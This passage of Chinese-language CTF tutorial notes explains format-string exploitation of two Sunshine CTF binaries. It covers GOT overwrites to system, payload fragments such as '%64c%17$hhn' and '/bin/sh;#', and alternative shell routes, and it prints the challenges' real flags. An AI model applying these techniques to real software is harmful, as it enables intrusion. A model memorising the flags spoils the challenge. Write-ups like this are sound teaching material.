  \texttt{aaaaba} 貢獻 6）。所以 \texttt{\%\allowbreak{}64c\%\allowbreak{}17\$\allowbreak{}hhn} 執行到
  \texttt{\%\allowbreak{}17\$\allowbreak{}hhn} 那一刻的計數是 \textbf{64}，不是 64+7 = 75。
  想自己驗證：把位址指到一個可寫位址（或 \texttt{printf@GOT}），寫完後用
  \texttt{/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}mem} 讀回來看最低 byte
  是不是你要的值（見 §5 的自檢腳本）。 （實測：手寫
  \texttt{\%\allowbreak{}64c\%\allowbreak{}17\$\allowbreak{}hhn} 去寫一個可寫位址，結果值是 \texttt{0x40} =
  64；如果是 0x47 = 71，就代表「格式指令會計數」，但事實並非如此。）
\item
  \textbf{\texttt{\%\allowbreak{}p} 對 0 會印
  \texttt{(nil)}}，\texttt{int(b"(nil)",\allowbreak{}16)} 會 exception。解析 leak
  時要處理。
\item
  \textbf{改完 GOT 後不要再等 \texttt{"(3)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}"}
  提示字元}。第 3 次迴圈的提示已被
  \texttt{system("(\%\allowbreak{}d)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}")} 取代，那個字串永遠不會出現
  → \texttt{recvuntil} 會等到 timeout。
\item
  \textbf{\texttt{system} 的 stderr 訊息是正常的}：bash 會說
  \texttt{sh:\allowbreak{}\ \allowbreak{}-\allowbreak{}c:\allowbreak{}\ \allowbreak{}line\ \allowbreak{}1:\allowbreak{}\ \allowbreak{}syntax\ \allowbreak{}error\ \allowbreak{}near\ \allowbreak{}unexpected\ \allowbreak{}token\ \allowbreak{}\textquotesingle{}\allowbreak{}newline\textquotesingle{}\allowbreak{}}，dash
  會說 \texttt{sh:\allowbreak{}\ \allowbreak{}1:\allowbreak{}\ \allowbreak{}Syntax\ \allowbreak{}error:\allowbreak{}\ \allowbreak{}"("\ \allowbreak{}unexpected}。它代表 GOT
  確實被改成 \texttt{system} 了 ------ 不要被嚇到以為壞了（但本 exploit
  會把它 drain 掉，所以你不一定看得到；見第 14 條）。
\item
  \textbf{只有 8 次機會}（\texttt{i=0..\allowbreak{}7}）。我們用了 3 次（leak / write
  / getshell），很寬裕。但如果你用 \texttt{\%\allowbreak{}hn} 分多次寫、或想多 leak
  幾輪，要記得數。
\item
  \textbf{libc
  版本差異}：\texttt{0x2a1ca}、\texttt{0x58740}、\texttt{0x600f0}
  都是\textbf{這份附件
  libc}（\texttt{GNU\ \allowbreak{}C\ \allowbreak{}Library\ \allowbreak{}(Ubuntu\ \allowbreak{}GLIBC\ \allowbreak{}2.\allowbreak{}39-\allowbreak{}0ubuntu8.\allowbreak{}3)}，BuildID
  \texttt{6d64b17fbac799e68da7ebd9985ddf9b5cb375e6}）專屬的。換 libc
  就要重找。 找不到 \texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}start\_\allowbreak{}call\_\allowbreak{}main} 的 symbol
  沒關係（stripped），可以搜尋 \texttt{call\ \allowbreak{}rax} 後面接
  \texttt{mov\ \allowbreak{}edi,\allowbreak{}eax;\ \allowbreak{}call\ \allowbreak{}exit} 的樣式。
\item
  \textbf{PIE 與 libc 的距離不是固定的}（本機
  \texttt{0x332000}/\texttt{0x333000}/\texttt{0x39a000} 都出現過；遠端
  PIE 在 \texttt{0x5d...}）。\textbf{一定要各自洩漏}，不能只算一個。
\item
  \textbf{\texttt{recvuntil(timeout=...)}
  逾時時，資料不會消失}，而是留在 pwntools 的內部緩衝區，之後的
  \texttt{recv}
  才吐出來。這會讓「你以為的輸出順序」全部錯亂。逾時後要改寫流程，不要接著用
  \texttt{recvuntil}。
\item
  \textbf{\texttt{pwntools} 會吃掉 \texttt{sys.\allowbreak{}argv}
  裡像識別字的參數}（\texttt{pwnlib.\allowbreak{}args} 的
  \texttt{free\_\allowbreak{}form}）。\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}REMOTE} 裡的
  \texttt{REMOTE} 會在 \texttt{from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*} 之後消失 → 本
  exploit 自己解析 \texttt{sys.\allowbreak{}argv{[}1{]}}，所以\textbf{要在 import
  之前讀 argv}。 \textgreater{} ※提示 如果你用的是 pwntools 官方的
  \texttt{args.\allowbreak{}REMOTE}（\texttt{wp/\allowbreak{}00\_\allowbreak{}基礎知識\_\allowbreak{}從零開始.\allowbreak{}md} §12
  的骨架），那不用理這條 ------ 實測 \texttt{sys.\allowbreak{}argv} 會從
  \texttt{{[}\textquotesingle{}\allowbreak{}-\allowbreak{}c\textquotesingle{}\allowbreak{},\allowbreak{}\textquotesingle{}\allowbreak{}REMOTE\textquotesingle{}\allowbreak{}{]}}
  變成 \texttt{{[}\textquotesingle{}\allowbreak{}-\allowbreak{}c\textquotesingle{}\allowbreak{}{]}}，但同一時間
  \textbf{\texttt{args.\allowbreak{}REMOTE\ \allowbreak{}==\ \allowbreak{}True}}，官方用法照樣正常。會出問題的只有「自己讀
  \texttt{sys.\allowbreak{}argv{[}1{]}}」的寫法。
\item
  \textbf{\texttt{system("(\%\allowbreak{}d)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}")} 會讓 shell 在
  stderr
  抱怨語法錯誤}（bash：\texttt{sh:\allowbreak{}\ \allowbreak{}-\allowbreak{}c:\allowbreak{}\ \allowbreak{}line\ \allowbreak{}1:\allowbreak{}\ \allowbreak{}syntax\ \allowbreak{}error\ \allowbreak{}near\ \allowbreak{}unexpected\ \allowbreak{}token\ \allowbreak{}\textbackslash{}\allowbreak{}}newline'\texttt{；dash：}sh:
  1: Syntax error: ``(''
  unexpected\texttt{）。\ \allowbreak{}本\ \allowbreak{}exploit\ \allowbreak{}用}drain()\texttt{把那段輸出**讀掉丟棄**，所以你在\ \allowbreak{}§8\ \allowbreak{}的輸出裡看不到\ \allowbreak{}——\ \allowbreak{}這是刻意的。\ \allowbreak{}遠端也不一定轉發\ \allowbreak{}stderr，**不要靠這行訊息判斷成功**；要看\ \allowbreak{}GOT\ \allowbreak{}是否真的被改（§5\ \allowbreak{}的}/proc//mem`
  自檢）。
\item
  \textbf{\texttt{fgets}
  讀不到資料（EOF）會直接跳出迴圈}（\texttt{test\ \allowbreak{}rax,\allowbreak{}rax;\ \allowbreak{}je\ \allowbreak{}1276}）。所以如果你一次把
  payload 送完就關閉 stdin，程式會提前結束。
\item
  \textbf{本機用 \texttt{./\allowbreak{}mad\_\allowbreak{}libs} 直接跑會噴 symbol lookup
  error}，一定要用題目的
  loader：\texttt{./\allowbreak{}ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}library-\allowbreak{}path\ \allowbreak{}.\allowbreak{}\ \allowbreak{}./\allowbreak{}mad\_\allowbreak{}libs}。
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{10.
其他也可以成功的路線（附錄）}\label{ux5176ux4ed6ux4e5fux53efux4ee5ux6210ux529fux7684ux8defux7ddaux9644ux9304}

\paragraph{\texorpdfstring{(A) 改 \texttt{fgets@GOT} →
\texttt{system}（本解法之外最常見的變體）}{(A) 改 fgets@GOT → system（本解法之外最常見的變體）}}\label{a-ux6539-fgetsgot-systemux672cux89e3ux6cd5ux4e4bux5916ux6700ux5e38ux898bux7684ux8b8aux9ad4}

把 \texttt{fgets@GOT}（\texttt{PIE+0x4018}）改成 \texttt{system}。然後在
buffer 裡放：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
/bin/sh;#AAAAAAAAAAAAAAAA...
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  下一輪 \texttt{fgets(buf,\allowbreak{}\ \allowbreak{}0x100,\allowbreak{}\ \allowbreak{}stdin)} 變成 \texttt{system(buf)}。
\item
  但 \texttt{system} 會忽略 \texttt{esi}/\texttt{rdx}，所以
  \texttt{system("/\allowbreak{}bin/\allowbreak{}sh;\#\allowbreak{}...")} → \texttt{sh\ \allowbreak{}-\allowbreak{}c\ \allowbreak{}"/\allowbreak{}bin/\allowbreak{}sh;\#\allowbreak{}..."}。
\item
  這樣只會開一個非互動的
  \texttt{/\allowbreak{}bin/\allowbreak{}sh\ \allowbreak{}-\allowbreak{}c}，\textbf{不適合要下指令的場合}；而且
  \texttt{printf(buf)} 那邊還印出 \texttt{/\allowbreak{}bin/\allowbreak{}sh;\#\allowbreak{}...}。
\item
  相較之下，改 \texttt{printf@GOT} 更乾淨：\texttt{system(buf)}
  直接拿到一個\textbf{互動式} shell。
\end{itemize}

\paragraph{\texorpdfstring{(B) 改 \texttt{printf@GOT} →
\texttt{one\_\allowbreak{}gadget}}{(B) 改 printf@GOT → one\_gadget}}\label{b-ux6539-printfgot-one_gadget}

\texttt{one\_\allowbreak{}gadget} 是 libc 裡「執行到就
\texttt{execve("/\allowbreak{}bin/\allowbreak{}sh")}」的單一位址（不用傳參數）。但： * 有
constraint（例如 \texttt{{[}rsp+0x50{]}\ \allowbreak{}==\ \allowbreak{}NULL}），不保證成立； *
這台機器\textbf{沒裝 \texttt{one\_\allowbreak{}gadget}}。 所以本題不建議。

\paragraph{\texorpdfstring{(C) 覆寫 \texttt{main}
的返回位址}{(C) 覆寫 main 的返回位址}}\label{c-ux8986ux5beb-main-ux7684ux8fd4ux56deux4f4dux5740}

\texttt{main} 的返回位址在第 43
個參數，我們已經能讀到它的\textbf{值}（libc 位址）。
但要\textbf{寫}它就得知道它在堆疊上的\textbf{絕對位址}（\texttt{main} 的
\texttt{rbp\ \allowbreak{}+\ \allowbreak{}8}）。我們洩漏的是 \texttt{{[}rbp{]}}
的\textbf{內容}（caller 的 rbp），不是 \texttt{rbp}
本身，所以還需要一個常數差；而且就算寫成功，\texttt{main} 返回時
\texttt{rdi} 也不受我們控制（不是 \texttt{system} 想要的參數）。 →
\textbf{GOT 路線簡單太多}。

\paragraph{\texorpdfstring{(D) 用 \texttt{\%\allowbreak{}s} 洩漏 libc 內容以辨識 libc
版本}{(D) 用 \%s 洩漏 libc 內容以辨識 libc 版本}}\label{d-ux7528-s-ux6d29ux6f0f-libc-ux5167ux5bb9ux4ee5ux8fa8ux8b58-libc-ux7248ux672c}

若遠端 libc 未知，可以讀 GOT 裡的 \texttt{puts}
位址（\texttt{\%\allowbreak{}\textless{}\allowbreak{}idx\textgreater{}\allowbreak{}\$\allowbreak{}s}
需要位址在參數裡），拿到 libc 實際 base 後再對照 libc database
找出正確的 libc。本題附件已經給了 libc，所以不需要。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{11.
一行指令重現}\label{ux4e00ux884cux6307ux4ee4ux91cdux73fe}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ cd /home/kzzz/Documents/code/ctf/sunshine/pwn2}
\NormalTok{$ python3 exploit.py REMOTE \textless{} /dev/null | tee remote.log | grep {-}A5 \textquotesingle{}FLAG:\textquotesingle{}}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{12. 產出檔案}\label{ux7522ux51faux6a94ux6848}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
檔案
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{exploit.\allowbreak{}py} & 完整 exploit，支援
\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py}（本機）與
\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}REMOTE}（遠端） \\
\texttt{FLAG.\allowbreak{}txt} & 真實
flag：\texttt{sun\{\allowbreak{}f1ll\_\allowbreak{}iN\_\allowbreak{}th3\_\allowbreak{}g0T\_\allowbreak{}eNtry\}\allowbreak{}} \\
\texttt{notes.\allowbreak{}md} & 本教學筆記 \\
\texttt{flag.\allowbreak{}txt} & 本機測試用的假 flag \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 4 --- pwn3 revolution（自製
printf）}\label{part-4-pwn3-revolutionux81eaux88fd-printf}

\begin{quote}
原始檔案：\texttt{pwn3/\allowbreak{}notes.\allowbreak{}md}
\end{quote}

\subsection{\texorpdfstring{Sunshine CTF --- \texttt{revolution}
完全新手教學筆記（繁體中文）}{Sunshine CTF --- revolution 完全新手教學筆記（繁體中文）}}\label{sunshine-ctf-revolution-ux5b8cux5168ux65b0ux624bux6559ux5b78ux7b46ux8a18ux7e41ux9ad4ux4e2dux6587}

\begin{quote}
這份筆記假設你\textbf{完全沒聽過} PWN、ROP、格式化字串漏洞，只會一點點 C
語言。 每一個用到的組合語言指令都會引用 \texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel}
的原始輸出並逐行解釋。
所有位址都是\textbf{實際驗證過}的（\texttt{readelf} / \texttt{objdump} /
\texttt{gdb}），不是猜的。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{0.
先看結論（懶人包）}\label{ux5148ux770bux7d50ux8ad6ux61f6ux4ebaux5305}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
項目
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
漏洞型態 & 自製（非 glibc）printf 的「可變參數」讀取區被初始化成
\textbf{main 的輸入緩衝區} \\
拿到的能力 & \texttt{\%\allowbreak{}N\$\allowbreak{}s} = 任意位址讀字串、\texttt{\%\allowbreak{}N\$\allowbreak{}w} =
任意位址寫 8 bytes（值可含 \texttt{\textbackslash{}\allowbreak{}x00}） \\
利用鏈 & 洩漏 \texttt{setvbuf@got} → 算 libc base → 把
\texttt{strcspn@got} 覆寫成 \texttt{system} → 下一行輸入被當成 shell
指令 \\
真實 flag & \texttt{sun\{\allowbreak{}cust0m\_\allowbreak{}fmtstr\_\allowbreak{}n0\_\allowbreak{}t00ls\_\allowbreak{}4ll0wed\}\allowbreak{}} \\
遠端 libc & Ubuntu 24.04 的
\texttt{libc6\ \allowbreak{}2.\allowbreak{}39-\allowbreak{}0ubuntu8(.\allowbreak{}1/.\allowbreak{}2/.\allowbreak{}3)}，\texttt{system\ \allowbreak{}=\ \allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x58740} \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1. 題目資訊}\label{ux984cux76eeux8cc7ux8a0a-2}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ file revolution
revolution: ELF 64-bit LSB executable, x86-64, dynamically linked,
            interpreter /lib64/ld-linux-x86-64.so.2, stripped
$ sha256sum revolution
918483831ef0b27d0cfb8afa9e0341f38d0a296931ccc5f73ef80f5d610f8fa5
$ ./revolution
=== PRINT PRINT REVOLUTION ===
Enter your score card template:
score> AAAA
AAAA
score> ^C
\end{Verbatim}

執行後它一直跟你要一行「score card template」，然後把那一行印回來，
但支援一些奇怪的格式：\texttt{\%\allowbreak{}1\$\allowbreak{}p}、\texttt{\%\allowbreak{}14\$\allowbreak{}s}、\texttt{\%\allowbreak{}14\$\allowbreak{}w}\ldots\ldots 這些\textbf{不是}
glibc 的 printf 語法， 而是程式自己寫的一台小「格式化虛擬機」。

\paragraph{1.1
保護機制（checksec）與白話解釋}\label{ux4fddux8b77ux6a5fux5236checksecux8207ux767dux8a71ux89e3ux91cb}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
保護
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
這題的狀態
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
白話解釋
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{PIE（Position Independent Executable）} &
\textbf{關閉}（\texttt{Type:\allowbreak{}\ \allowbreak{}EXEC}，載入位址固定 \texttt{0x400000}） &
程式碼/資料的位址每次執行都一樣。好處：我們可以直接寫死
\texttt{0x404010} 這種位址。 \\
\textbf{ASLR（Address Space Layout Randomization）} &
系統層級\textbf{開啟}（libc 每次載入位址都不同） &
\texttt{libc}、\texttt{stack}、\texttt{ld.\allowbreak{}so}
的位址每次執行隨機。所以「程式內位址固定、libc
位址要洩漏」是這題的核心。 \\
\textbf{NX（No-eXecute，\texttt{GNU\_\allowbreak{}STACK\ \allowbreak{}RW}）} & \textbf{開啟} &
堆疊/資料區不可執行 → 不能把 shellcode 放堆疊然後跳過去執行。 \\
\textbf{RELRO（GNU\_RELRO \texttt{0x403dc0} + \texttt{0x240} = 到
\texttt{0x404000}）} & \textbf{Partial} & 只有
\texttt{.\allowbreak{}init\_\allowbreak{}array/.\allowbreak{}fini\_\allowbreak{}array/.\allowbreak{}dynamic/.\allowbreak{}got}（\texttt{0x403dc0}--\texttt{0x404000}）被設成唯讀；\textbf{\texttt{.\allowbreak{}got.\allowbreak{}plt}（\texttt{0x404000}
之後）仍然可寫} → 可以改 GOT。 \\
\textbf{Canary（\texttt{-\allowbreak{}fstack-\allowbreak{}protector}）} &
\textbf{沒有}（\texttt{readelf\ \allowbreak{}-\allowbreak{}s} 找不到
\texttt{\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail}） &
堆疊溢位不會被偵測；不過這題也用不到堆疊溢位。 \\
\textbf{CET / IBT（\texttt{endbr64}）} & 有編進指令但硬體沒強制 &
\texttt{endbr64} 只是 CET 的合法跳躍點標記，不影響我們。 \\
\end{longtable}
}

指令驗證：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{$}\NormalTok{ readelf }\AttributeTok{{-}lW}\NormalTok{ revolution }\KeywordTok{|} \FunctionTok{grep} \AttributeTok{{-}E} \StringTok{"GNU\_RELRO|GNU\_STACK"}
  \ExtensionTok{GNU\_STACK}\NormalTok{  ... RW  0x10          }\CommentTok{\# NX on}
  \ExtensionTok{GNU\_RELRO}\NormalTok{  0x002dc0 0x403dc0 0x403dc0 0x000240 0x000240 R 0x1}
\ExtensionTok{$}\NormalTok{ readelf }\AttributeTok{{-}h}\NormalTok{ revolution }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ Type}
  \ExtensionTok{Type:}\NormalTok{  EXEC }\ErrorTok{(}\ExtensionTok{Executable}\NormalTok{ file}\KeywordTok{)}    \CommentTok{\# non{-}PIE}
\end{Highlighting}
\end{Shaded}

\paragraph{1.2 相關檔案}\label{ux76f8ux95dcux6a94ux6848}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{0x4010d0} & \texttt{main()}（被 strip 掉名字，就是
\texttt{\_\allowbreak{}start} 傳給 \texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}start\_\allowbreak{}main} 的那個函式，見
\texttt{0x4011e8:\allowbreak{}\ \allowbreak{}mov\ \allowbreak{}rdi,\allowbreak{}0x4010d0}） \\
\texttt{0x401330} & 自製 \texttt{printf(fmt,\allowbreak{}\ \allowbreak{}...)} \\
\texttt{0x4012c0} & 自製
\texttt{va\_\allowbreak{}arg}：\texttt{get\_\allowbreak{}arg(va\_\allowbreak{}list\ \allowbreak{}*ap,\allowbreak{}\ \allowbreak{}int\ \allowbreak{}n)} \\
\texttt{0x401190} & 初始化：對 stdout/stderr 呼叫
\texttt{setvbuf(...,\allowbreak{}\_\allowbreak{}IONBF)}（它是 \texttt{.\allowbreak{}init\_\allowbreak{}array{[}1{]}}，在
\texttt{main} 之前執行） \\
\end{longtable}
}

\texttt{\_\allowbreak{}IONBF\ \allowbreak{}=\ \allowbreak{}2}
是「\textbf{不緩衝}」（\texttt{\_\allowbreak{}IO\_\allowbreak{}UNBUFFERED}）：每次
\texttt{write()} 都立刻送到 socket／終端機。 所以我們用
\texttt{recvuntil(b\textquotesingle{}\allowbreak{}score\textgreater{}\allowbreak{}\ \allowbreak{}\textquotesingle{}\allowbreak{})}
收輸出時，不會有「資料卡在 libc 緩衝區裡還沒送出來」的問題 （pwn2 §2.4
也靠同一招）。這也是為什麼 \texttt{exploit.\allowbreak{}py}
可以直接一行一行地問答，不必手動 flush。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{2. x86-64
速成班（看不懂組語的人先看這節）}\label{x86-64-ux901fux6210ux73edux770bux4e0dux61c2ux7d44ux8a9eux7684ux4ebaux5148ux770bux9019ux7bc0}

\paragraph{2.1 暫存器}\label{ux66abux5b58ux5668-2}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
64-bit
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
32-bit
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
用途 / 誰負責保存
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{rax} & \texttt{eax} &
函式\textbf{回傳值}；也被拿來暫存運算結果 \\
\texttt{rbx} & \texttt{ebx} &
一般用途。\textbf{callee-saved}：被呼叫的函式要自己還原 \\
\texttt{rcx} & \texttt{ecx} & 第 4
個參數；也常當迴圈計數器、移位量（\texttt{shr\ \allowbreak{}rsi,\allowbreak{}\ \allowbreak{}cl}） \\
\texttt{rdx} & \texttt{edx} & 第 3 個參數 \\
\texttt{rsi} & \texttt{esi} & 第 2 個參數 \\
\texttt{rdi} & \texttt{edi} & 第 1 個參數 \\
\texttt{rbp} & \texttt{ebp} & 傳統「框架指標」（frame pointer） \\
\texttt{rsp} & \texttt{esp} &
\textbf{堆疊指標}，永遠指向堆疊最頂端（低位址） \\
\texttt{r8}--\texttt{r15} & \texttt{r8d}--\texttt{r15d} & 第 5、6
個參數（\texttt{r8},\texttt{r9}）與一般用途；\texttt{r12}--\texttt{r15}
是 callee-saved \\
\end{longtable}
}

\paragraph{2.2 System V AMD64 呼叫慣例（Linux
的規定）}\label{system-v-amd64-ux547cux53ebux6163ux4f8blinux-ux7684ux898fux5b9a}

\begin{itemize}
\tightlist
\item
  整數/指標參數依序放：\texttt{rdi}, \texttt{rsi}, \texttt{rdx},
  \texttt{rcx}, \texttt{r8}, \texttt{r9}，第 7 個之後\textbf{推上堆疊}。
\item
  浮點參數放 \texttt{xmm0}--\texttt{xmm7}。
\item
  回傳值放 \texttt{rax}（浮點在 \texttt{xmm0}）。
\item
  \texttt{rax}、\texttt{rcx}、\texttt{rdx}、\texttt{rsi}、\texttt{rdi}、\texttt{r8}--\texttt{r11}
  是 \textbf{caller-saved}（呼叫別人的函式後可能被改爛）。
\item
  \texttt{rbx}、\texttt{rbp}、\texttt{r12}--\texttt{r15}、\texttt{rsp}
  是 \textbf{callee-saved}（被呼叫者必須原值還原）。
\item
  \textbf{\texttt{call}
  會把下一道指令的位址（返回位址）推入堆疊；\texttt{ret} 會把它彈回
  \texttt{rip}。}
\end{itemize}

這題的 \texttt{0x4012c0} 就是在\textbf{手工模擬}「參數在哪裡」這件事
------ 這是理解本題漏洞的關鍵。

\paragraph{2.3 堆疊框架（stack
frame）}\label{ux5806ux758aux6846ux67b6stack-frame}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
        高位址
        ┌──────────────────────────┐
        │ 呼叫者的資料             │
        ├──────────────────────────┤
        │ 返回位址 (call 推入的)   │ ← 進入函式時 rsp 指這裡
        ├──────────────────────────┤
        │ 被呼叫者 push 的舊 rbp...│
        ├──────────────────────────┤
        │ 被呼叫者的區域變數       │ ← sub rsp, N 之後 rsp 指這裡
        └──────────────────────────┘
        低位址
\end{Verbatim}

\texttt{push\ \allowbreak{}rax}
等於「\texttt{rsp\ \allowbreak{}-=\ \allowbreak{}8;\ \allowbreak{}{[}rsp{]}\ \allowbreak{}=\ \allowbreak{}rax}」，\texttt{pop\ \allowbreak{}rax}
等於「\texttt{rax\ \allowbreak{}=\ \allowbreak{}{[}rsp{]};\ \allowbreak{}rsp\ \allowbreak{}+=\ \allowbreak{}8}」。

\paragraph{2.4
本題用到的指令速查}\label{ux672cux984cux7528ux5230ux7684ux6307ux4ee4ux901fux67e5}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意思
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{mov\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & 複製（\texttt{mov\ \allowbreak{}rbx,\allowbreak{}\ \allowbreak{}rsp} = 把 rsp
的值複製到 rbx） \\
\texttt{movzx\ \allowbreak{}eax,\allowbreak{}\ \allowbreak{}BYTE\ \allowbreak{}PTR\ \allowbreak{}{[}rdi{]}} & 讀 1 byte
並\textbf{零擴展}成 32 bit（高位補 0，用於無號） \\
\texttt{movsx\ \allowbreak{}eax,\allowbreak{}\ \allowbreak{}al} / \texttt{movsxd\ \allowbreak{}rax,\allowbreak{}\ \allowbreak{}eax} &
\textbf{符號擴展}（高位補 sign bit，用於有號） \\
\texttt{lea\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}{[}base+index*scale+disp{]}} &
算\textbf{位址}（不是讀記憶體！）\texttt{lea\ \allowbreak{}rsi,{[}rip+0xf46{]}} =
取一段位址 \\
\texttt{add/\allowbreak{}sub\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}imm} & 加/減 \\
\texttt{cmp\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}b} & 做 \texttt{a\ \allowbreak{}-\allowbreak{}\ \allowbreak{}b} 但只設定旗標（不存結果） \\
\texttt{test\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}a} & 做 AND 只設旗標；\texttt{test\ \allowbreak{}rax,\allowbreak{}rax}
常用來判斷「是否為 0 / 正負」 \\
\texttt{jmp\ \allowbreak{}label} & 無條件跳躍 \\
\texttt{je/\allowbreak{}jne/\allowbreak{}jg/\allowbreak{}jle/\allowbreak{}ja/\allowbreak{}jbe\ \allowbreak{}label} &
條件跳躍（等於/不等於/大於/小於等於/無號大於/無號小於等於） \\
\texttt{call\ \allowbreak{}addr} / \texttt{ret} &
呼叫（推入返回位址）／返回（彈出返回位址） \\
\texttt{push} / \texttt{pop} & 推入／彈出堆疊 \\
\texttt{xor\ \allowbreak{}eax,\allowbreak{}\ \allowbreak{}eax} & 把 eax 清零（比 \texttt{mov\ \allowbreak{}eax,\allowbreak{}0}
短）；\texttt{xor} 只在旗標上做 XOR 運算 \\
\texttt{and\ \allowbreak{}esi,\allowbreak{}\ \allowbreak{}0xf} & 位元 AND（取低位 nibble） \\
\texttt{shr\ \allowbreak{}rsi,\allowbreak{}\ \allowbreak{}cl} & 邏輯右移，移位量放在 \texttt{cl}（rcx 的低 8
位） \\
\texttt{endbr64} / \texttt{nop} / \texttt{xchg\ \allowbreak{}ax,\allowbreak{}ax} & 空操作／CET
標記，不影響邏輯 \\
\end{longtable}
}

\paragraph{2.5 PLT / GOT 與延遲綁定（lazy
binding）}\label{plt-got-ux8207ux5ef6ux9072ux7d81ux5b9alazy-binding}

程式呼叫 libc 函式時，不會直接跳到 libc，而是先跳到一個小跳板：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0000000000401080 <write@plt>:            ← 程式碼裡 call 0x401080
  401080: endbr64
  401084: jmp QWORD PTR [rip+0x2f76]     # 404000  ← 讀 GOT 裡的值跳過去
\end{Verbatim}

